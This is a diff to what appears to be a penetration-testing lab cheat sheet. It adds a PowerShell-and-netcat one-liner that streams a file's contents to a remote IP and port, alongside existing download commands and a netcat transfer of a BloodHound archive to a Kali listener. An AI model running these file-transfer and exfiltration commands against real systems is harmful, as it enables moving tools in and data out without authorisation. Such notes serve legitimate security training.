@@ -9,6 +9,16 @@ Invoke-WebRequest//iwr//wget -Uri <URI> -OutFile "<BINPATH>"
 $webClient = [System.Net.WebClient]::new();$webClient.DownloadFile("<URI>", "<BINPATH>")
 
 
+- TRANSFER/DOWNLOAD:
+
+With netcat, we can use the following command to extract the contents of a file and transfer through a network socket:
+
+```
+Get-Content <filename> | <pathtonc.exe> <localip> <localport>
+```
+
+For example; Get-Content auditTracker.exe | C:\Users\wario\nc.exe 192.168.45.239 8888
+
 ----------------------------------
 Batch
 
@@ -27,4 +37,3 @@ For example; from the Windows host to our kali machine:
 .\nc.exe 192.168.45.249 4445 < audit_20230905093345_BloodHound.zip
 
 nc -lvp 4445 > audit_beyond_clientwk1.zip
-
